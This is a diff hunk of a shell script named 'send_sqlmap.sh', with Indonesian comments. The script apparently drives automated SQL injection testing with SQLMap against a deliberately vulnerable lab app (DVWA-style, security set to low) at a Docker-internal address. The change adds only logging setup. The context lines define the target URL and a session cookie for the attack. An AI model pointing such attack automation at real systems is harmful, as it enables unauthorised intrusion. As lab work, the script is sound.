@@ -2,6 +2,17 @@
 # attacker-scripts/send_sqlmap.sh
 # Menjalankan pengujian otomatis menggunakan SQLMap (sebagai Attacker).
 
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+
+# ── Logging Setup ──────────────────────────────────────────────
+LOG_DIR="$SCRIPT_DIR/saved_logs/attacker"
+mkdir -p "$LOG_DIR"
+LOG_FILE="$LOG_DIR/log-nomor 3_send_sqlmap.txt"
+exec > >(tee -a "$LOG_FILE") 2>&1
+echo "[LOG] Logging dimulai: $(date '+%Y-%m-%d %H:%M:%S')"
+echo "[LOG] File log: $LOG_FILE"
+# ───────────────────────────────────────────────────────────────
+
 TARGET_IP="172.17.0.2"
 TARGET_URL="http://$TARGET_IP/vulnerabilities/sqli/?id=1&Submit=Submit"
 COOKIE="PHPSESSID=pnb708okemms8g0a3ejaocb535; security=low"
